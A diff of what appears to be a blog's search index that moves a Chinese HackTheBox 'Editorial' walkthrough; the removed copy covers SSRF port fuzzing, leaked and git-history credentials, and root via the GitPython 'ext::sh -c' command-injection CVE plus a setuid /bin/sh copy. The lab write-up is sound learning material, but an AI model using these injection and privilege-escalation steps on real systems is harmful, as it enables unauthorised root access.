@@ -205,181 +205,10 @@
 
 ]]></content>
       <categories>
-        <category>代码审计</category>
-        <category>Java安全审计</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>Java安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox - Editorial</title>
-    <url>/2025/03/05/HackTheBox-Editorial/</url>
-    <content><![CDATA[<h2 id="外网信息探测："><a href="#外网信息探测：" class="headerlink" title="外网信息探测："></a>外网信息探测：</h2><p><strong>Nmap 服务探测</strong></p>
-<p>目标IP 10.10.11.20</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -n -Pn -sS -p- --min-rate 10000 10.10.11.20</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 18:28 CST</span><br><span class="line">Nmap scan report for 10.10.11.20</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">22/tcp open ssh</span><br><span class="line">80/tcp open http</span><br><span class="line"></span><br><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sTVC -O -p22,80 10.10.11.20 </span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)</span><br><span class="line">|_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://editorial.htb</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>Web 服务测试</strong></p>
-<p>扫描结果显示80端口重定向到 <code>http://editorial.htb</code>，但 <code>Nmap</code> 无法跟随至该域名，添加域名解析。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure></div>
-
-<p>访问 <code>http://editorial.htb</code>，首页是一个静态页面，尽管我尝试点击了所有可能的交互点，但程序并没有提供交互功能</p>
-<p>接着访问 <code>/upload</code>，提供了一个表单提交的功能</p>
-<p>填写表单并发送请求，发现回显了一个图片路径</p>
-<p>访问图片路径，是一个错误图片</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212558110.png" class title="image-20241021212558110">
-
-<p>我在本地监听7788，将表单信息改为本地IP并点击预览，本地接收到了目标发送的HTTP请求</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212839106.png" class title="image-20241021212839106">
-
- <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212540182.png" class>
-
-<p> 如果我在本地开启 Python Web 服务，并提供 image.png 图片，目标会读取图片， 同时网页也显示出读取的图片</p>
- <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021213912229.png" class title="image-20241021213912229">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214406645.png" class title="image-20241021214406645">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021213918249.png" class title="image-20241021213918249">
-
-<p> 当我不提供任何图片时，直接让目标访问 Python Web服务根目录，目标会读取根目录列表并存在服务器中</p>
- <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021214926014.png" class title="image-20241021214926014">
-
-<p> 这表明目标可以读取任何有效的 URL 内容</p>
-<h2 id="SSRF内部端口识别："><a href="#SSRF内部端口识别：" class="headerlink" title="SSRF内部端口识别："></a>SSRF内部端口识别：</h2><p>通过该程序提供的 HTTP 请求功能，我尝试判断是否存在<strong>本地无法访问的服务端口</strong></p>
-<p>首先将表单信息改为127.0.0.1，端口改为80、22，这是已知的两个端口，分别提交。80端口等待了长时间才返回结果，而22端口立刻就返回了结果，结果仍然回显之前的错误图片</p>
- <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215635729.png" class title="image-20241021215635729">
-
- <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215803803.png" class title="image-20241021215803803">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021215751200.png" class title="image-20241021215751200">
-
-<p>我再次尝试请求一个不存在的端口</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095339258.png" class title="image-20241022095339258">
-
-<p>和22端口一样很快的返回了结果，同样是之前的错误图片</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095356826.png" class>
-
-<p><strong>接下来我尝试枚举所有端口。</strong></p>
-<p>将 HTTP 请求体中需要替换的内容使用占位符FUZZ替代，并保存在 requests.txt，使用 <code>ffuf</code> 进行SSRF fuzz</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021222128775.png" class>
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w &lt;(seq 0 65535) -ac</span><br></pre></td></tr></table></figure></div>
-
-<p>扫描完毕，结果显示 5000 端口内部开放</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022101049760.png" class title="image-20241022101049760">
-
-<p>5000 端口是一个内部运行的端口，我并不知道它运行的是什么服务</p>
-<p>尝试请求 5000 端口，服务器返回了不同的结果</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022095746155.png" class title="image-20241022095746155">
-
-<p>BurpSuite全部放包，不然包被卡住，服务器不会存储读取的信息。</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022100814908.png" class title="image-20241022100814908">
-
-<p>然后读取文件，缓存时间比较短暂，因为有一个自动清理的程序在运行，一会就自动清理了</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022101125499.png" class title="image-20241022101125499">
-
-<p>将文本进行 Json 格式化</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022102238058.png" class title="image-20241022102238058">
-
-<p>服务器特别像 Flask 或 Gunicorn 等框架，根据 Json 信息，推测它可能在运行基于Python 及 Flask 构建的 Web API 应用。这个应用负责处理 HTTP 请求，并响应 JSON 格式的数据，用于处理和管理用户、版本更新等信息，<strong>接下来我尝试去抓取这些API端点信息</strong></p>
-<h3 id="API端点信息获取："><a href="#API端点信息获取：" class="headerlink" title="API端点信息获取："></a>API端点信息获取：</h3><p>依次请求各个API</p>
-<p><a class="link" href="http://127.0.0.1:5000/api/latest/metadata/messages/coupons">http://127.0.0.1:5000/api/latest/metadata/messages/coupons<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> </p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022104448557.png" class title="image-20241022104448557">
-
-<p>&#x2F;api&#x2F;latest&#x2F;metadata&#x2F;messages&#x2F;authors</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022105709117.png" class title="image-20241022105709117">
-
-<p>&#x2F;api&#x2F;latest&#x2F;metadata&#x2F;changelog</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110151574.png" class title="image-20241022110151574">
-
-<p>在authors中，惊人地发现账户密码泄露，使用 SSH 尝试连接，登录成功</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev/dev080217_devAPI!@</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022110453419.png" class title="image-20241022110453419">
-
-<h2 id="dev-prod-用户移动："><a href="#dev-prod-用户移动：" class="headerlink" title="dev -&gt; prod 用户移动："></a>dev -&gt; prod 用户移动：</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>对内网进行基础信息枚举</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for dev: </span><br><span class="line">Sorry, user dev may not run sudo on editorial.</span><br></pre></td></tr></table></figure></div>
-
-<p>列出SUID文件，但并没有可利用提权的文件</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br></pre></td></tr></table></figure></div>
-
-<p>系统下存在两个用户，dev、prod</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~$ cd /home</span><br><span class="line">dev@editorial:/home$ ls</span><br><span class="line">dev  prod</span><br><span class="line">dev@editorial:/home$ ls -liah</span><br><span class="line">total 16K</span><br><span class="line">76438 drwxr-xr-x  4 root root 4.0K Jun  5 14:36 .</span><br><span class="line">    2 drwxr-xr-x 18 root root 4.0K Jun  5 14:54 ..</span><br><span class="line">79764 drwxr-x---  4 dev  dev  4.0K Oct 22 06:52 dev</span><br><span class="line">77643 drwxr-x---  5 prod prod 4.0K Jun  5 14:36 prod</span><br></pre></td></tr></table></figure></div>
-
-<p>我传入<strong>pspy64监控定时任务</strong>，发现服务器定时执行 clear.sh 脚本清理 <code>/static/uploads/.</code> 目录，这也对应了前面调用服务器发送 HTTP 请求读取信息，一会缓存就没了的情况。</p>
-<p>可惜该文件是只读文件，无法被普通用户修改</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115252379.png" class title="image-20241022115252379">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022115654170.png" class title="image-20241022115654170">
-
-<h3 id="Git-历史记录敏感信息收集："><a href="#Git-历史记录敏感信息收集：" class="headerlink" title="Git 历史记录敏感信息收集："></a>Git 历史记录敏感信息收集：</h3><p>dev 用户路径下存在一个 apps 目录</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:/home$ cd ~</span><br><span class="line">dev@editorial:~$ ls -liah</span><br><span class="line">total 36K</span><br><span class="line">79764 drwxr-x--- 4 dev  dev  4.0K Oct 22 06:52 .</span><br><span class="line">76438 drwxr-xr-x 4 root root 4.0K Jun  5 14:36 ..</span><br><span class="line">79704 drwxrwxr-x 3 dev  dev  4.0K Jun  5 14:36 apps</span><br><span class="line">80303 lrwxrwxrwx 1 root root    9 Feb  6  2023 .bash_history -&gt; /dev/null</span><br><span class="line">80301 -rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout</span><br><span class="line">80256 -rw-r--r-- 1 dev  dev  3.7K Jan  6  2022 .bashrc</span><br><span class="line">79703 drwx------ 2 dev  dev  4.0K Jun  5 14:36 .cache</span><br><span class="line">  187 -rw------- 1 dev  dev    20 Oct 22 06:52 .lesshst</span><br><span class="line">80300 -rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile</span><br><span class="line">83829 -rw-r----- 1 root dev    33 Oct 22 04:06 user.txt</span><br></pre></td></tr></table></figure></div>
-
-<p>进入该目录，发现这是一个 <code>git</code> 项目文件夹，<code>.git</code> 目录仍然存在，说明这个项目之前使用了 Git 进行版本控制。然而，当运行 git status 时，Git 显示了项目中的文件都已被删除。</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ ls -liah</span><br><span class="line">total 12K</span><br><span class="line">79704 drwxrwxr-x 3 dev dev 4.0K Jun  5 14:36 .</span><br><span class="line">79764 drwxr-x--- 4 dev dev 4.0K Oct 22 06:52 ..</span><br><span class="line">77696 drwxr-xr-x 8 dev dev 4.0K Oct 22 06:49 .git</span><br><span class="line"></span><br><span class="line">dev@editorial:~/apps$ git status</span><br><span class="line"></span><br><span class="line">On branch master                                                                  </span><br><span class="line">Changes not staged for commit:                                                  </span><br><span class="line">  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)                   </span><br><span class="line">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)        </span><br><span class="line">  </span><br><span class="line">        deleted:    app_api/app.py                                                </span><br><span class="line">        deleted:    app_editorial/app.py                                       </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.css                 </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.css.map              </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.min.css                                         </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.min.css.map                                     </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css                                         </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.css.map                                     </span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-grid.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-reboot.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap-utilities.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.css.map</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css</span><br><span class="line">        deleted:    app_editorial/static/css/bootstrap.rtl.min.css.map</span><br><span class="line">        deleted:    app_editorial/static/images/login-background.jpg</span><br><span class="line">        deleted:    app_editorial/static/images/pexels-janko-ferlic-590493.jpg</span><br><span class="line">        deleted:    app_editorial/static/images/pexels-min-an-694740.jpg</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.bundle.min.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.esm.min.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.js.map</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.min.js</span><br><span class="line">        deleted:    app_editorial/static/js/bootstrap.min.js.map</span><br><span class="line">        deleted:    app_editorial/templates/about.html</span><br><span class="line">        deleted:    app_editorial/templates/index.html</span><br><span class="line">        deleted:    app_editorial/templates/upload.html</span><br></pre></td></tr></table></figure></div>
-
-<p>Git 是一个分布式版本控制系统，它允许开发者跟踪代码库的变化，并且可以在不同版本之间切换。<code>.git</code> 目录是一个隐藏文件夹，存储了该项目的所有版本历史记录、分支信息、提交记录等。</p>
-<p><code>.git</code> 目录通常包含的内容有：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">objects/：存储着项目的所有数据对象，每一个文件的所有版本都存储为对象。</span><br><span class="line">refs/：记录了分支和标签。</span><br><span class="line">config：Git 项目的配置文件。</span><br><span class="line">HEAD：指向当前活动的分支。</span><br></pre></td></tr></table></figure></div>
-
-<p>推测开发者可能删除了项目文件，但忘记了删除 <code>.git</code> 目录，导致版本控制信息还留在系统中。这种情况下，仍然可以通过 <code>.git</code> 恢复被删除的文件或获取有用的敏感信息。</p>
-<p>查看之前的提交，寻找敏感信息，有时候开发者可能会在提交历史中留下敏感信息，比如API密钥、数据库密码，甚至是应用程序的凭据。</p>
-<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ git log --oneline</span><br><span class="line">8ad0f31 (HEAD -&gt; master) fix: bugfix in api port endpoint</span><br><span class="line">dfef9f2 change: remove debug and update api port</span><br><span class="line">b73481b change(api): downgrading prod to dev</span><br><span class="line">1e84a03 feat: create api to editorial info</span><br><span class="line">3251ec9 feat: create editorial app</span><br><span class="line"></span><br><span class="line">//git log --oneline 以简洁的方式展示Git仓库的提交历史，每个提交信息会包含一个提交的哈希值以及提交时的简要描述</span><br></pre></td></tr></table></figure></div>
-
-<p>发现提交记录中，有这样一句 <code>downgrading prod to dev</code>，这句信息表明开发者将 prod 降级为 dev，这有可能存在敏感信息，使用 <code>git diff</code> 查看代码更改的差异，定位具体更改内容</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dev@editorial:~/apps$ git diff 1e84a03 b73481b</span><br><span class="line">diff --git a/app_api/app.py b/app_api/app.py</span><br><span class="line">index 61b786f..3373b14 100644</span><br><span class="line">--- a/app_api/app.py</span><br><span class="line">+++ b/app_api/app.py</span><br><span class="line">@@ -64,7 +64,7 @@ def index():</span><br><span class="line"> @app.route(api_route + &#x27;/authors/message&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line"> def api_mail_new_authors():</span><br><span class="line">     return jsonify(&#123;</span><br><span class="line">-        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;</span><br><span class="line">+        &#x27;template_mail_message&#x27;: &quot;Welcome to the team! We are thrilled to have you on board and can&#x27;t wait to see the incredible content you&#x27;ll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon&#x27;t hesitate to reach out if you have any questions or ideas - we&#x27;re always here to support you.\n\nBest regards, &quot; + api_editorial_name + &quot; Team.&quot;</span><br><span class="line">     &#125;) # TODO: replace dev credentials when checks pass</span><br><span class="line"> </span><br><span class="line"> # -------------------------------</span><br></pre></td></tr></table></figure></div>
-
-<p>使用 <code>git diff</code> ，在两次更改的差异中找到了密码信息</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Username: prod</span><br><span class="line">- Password: 080217_Producti0n_2023!@</span><br><span class="line">+ Username: dev</span><br><span class="line">+ Password: dev080217_devAPI!@</span><br></pre></td></tr></table></figure></div>
-
-<p>使用账号密码切换 prod 用户</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241022173023570.png" class title="image-20241022173023570">
-
-<h2 id="Root-权限提升："><a href="#Root-权限提升：" class="headerlink" title="Root 权限提升："></a>Root 权限提升：</h2><p>从 <code>Dev</code> 用户切换至 <code>Prod</code> 用户，并用 <code>sudo -l </code> 列出用户具有的 <code>sudo</code> 权限，发现具备使用 root 权限运行 <code>clone_prod_change.py</code> 文件的权限</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">prod@editorial:~$ sudo -l</span><br><span class="line">[sudo] password for prod: </span><br><span class="line">Matching Defaults entries for prod on editorial:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User prod may run the following commands on editorial:</span><br><span class="line">    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *</span><br></pre></td></tr></table></figure></div>
-
-<p>查看 <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code> 文件，发现代码使用了 <code>gitpython</code> 库调用 <code>git</code></p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145910846.png" class title="image-20241024145910846">
-
-<p>发现当前 <code>GitPython</code> 库版本为 3.1.29，低于 3.1.30，这个版本存在 CVE 漏洞</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145558285.png" class title="image-20241024145558285">
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024145825520.png" class title="image-20241024145825520">
-
-<p>根据官方文档，该漏洞受影响的函数是 <code>git.repo.base.Repo.clone_from</code> ，该函数的第一个参数接收一个 URL ，假如对这个参数不做检验直接传给 <code>clone_from</code> 函数，就会造成命令执行漏洞</p>
-<p>接下来我给 <code>clone_prod_change.py</code> 文件传入 <code>ext::sh -c touch% /tmp/FuXian</code></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c touch% /tmp/FuXian&quot;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024150233332.png" class title="image-20241024150233332">
-
-<p>看到虽然报错，但成功创建了 <code>/tmp/FuXian</code> 目录，漏洞复现成功。</p>
-<p><strong>利用该漏洞提权</strong></p>
-<p>创建一个bash脚本，将 <code>/bin/sh</code> 复制至 <code>/tmp/a</code> ，给 <code>/tmp/a</code> 文件提升至 root 权限，并赋予 SetUID、SetGID</p>
-<p>Setuid（设置用户 ID 位）：当文件具有 setuid 权限时，无论谁执行该文件，该进程将以文件所有者的权限运行。<br>Setgid（设置组 ID 位）：当文件具有 setgid 权限时，无论谁执行该文件，该进程将以文件所属组的权限运行。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/a</span><br><span class="line">chown root:root /tmp/a</span><br><span class="line">chmod 6777 /tmp/a</span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &#x27;#!/bin/bash\n\ncp /bin/sh /tmp/a\nchown root:root /tmp/a\nchmod 6777 /tmp/a&#x27; &gt; /dev/shm/a.sh</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024151528414.png" class title="image-20241024151528414">
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x a.sh</span><br><span class="line">sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c touch% /dev/shm/a.sh&quot;</span><br></pre></td></tr></table></figure></div>
-
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024151936910.png" class title="image-20241024151936910">
-
-<p>执行 <code>/tmp/a</code> ，<code>-p</code> 保留权限，完成 Root 提权</p>
-<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241024152551978.png" class title="image-20241024152551978">
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>靶机系列</category>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>综合渗透靶机</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -624,6 +453,176 @@
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox - Editorial</title>
+    <url>/2025/03/05/HackTheBox-Editorial/</url>
+    <content><![CDATA[<h2 id="外网信息探测："><a href="#外网信息探测：" class="headerlink" title="外网信息探测："></a>外网信息探测：</h2><p><strong>Nmap 服务探测</strong></p>
+<p>目标IP 10.10.11.20</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -n -Pn -sS -p- --min-rate 10000 10.10.11.20</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 18:28 CST</span><br><span class="line">Nmap scan report for 10.10.11.20</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT STATE SERVICE</span><br><span class="line">22/tcp open ssh</span><br><span class="line">80/tcp open http</span><br><span class="line"></span><br><span class="line">┌──(mighty㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sTVC -O -p22,80 10.10.11.20 </span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">| 256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)</span><br><span class="line">|_ 256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)</span><br><span class="line">80/tcp open http nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://editorial.htb</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>Web 服务测试</strong></p>
+<p>扫描结果显示80端口重定向到 <code>http://editorial.htb</code>，但 <code>Nmap</code> 无法跟随至该域名，添加域名解析。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>访问 <code>http://editorial.htb</code>，首页是一个静态页面，尽管我尝试点击了所有可能的交互点，但程序并没有提供交互功能</p>
+<p>接着访问 <code>/upload</code>，提供了一个表单提交的功能</p>
+<p>填写表单并发送请求，发现回显了一个图片路径</p>
+<p>访问图片路径，是一个错误图片</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212558110.png" class title="image-20241021212558110">
+
+<p>我在本地监听7788，将表单信息改为本地IP并点击预览，本地接收到了目标发送的HTTP请求</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212839106.png" class title="image-20241021212839106">
+
+ <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021212540182.png" class>
+
+<p> 如果我在本地开启 Python Web 服务，并提供 image.png 图片，目标会读取图片， 同时网页也显示出读取的图片</p>
+ <img lazyload src="/images/loading.svg" data-src="/2025/03/05/HackTheBox-Editorial/image-20241021213912229.png" class title="image-20241021213912229">
+
